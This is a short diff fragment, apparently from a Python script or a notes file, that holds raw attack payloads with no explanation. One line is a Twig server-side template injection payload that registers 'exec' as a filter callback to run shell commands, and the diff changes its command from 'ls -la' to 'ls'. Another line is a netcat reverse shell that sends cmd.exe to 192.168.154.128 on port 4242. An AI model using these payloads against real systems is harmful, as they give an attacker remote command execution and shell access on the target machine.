@@ -23,7 +23,7 @@ if __name__ == '__main__':
 
   
 
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ls -la")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ls")}}
         
 nc.exe -e cmd.exe 192.168.154.128 4242       
         
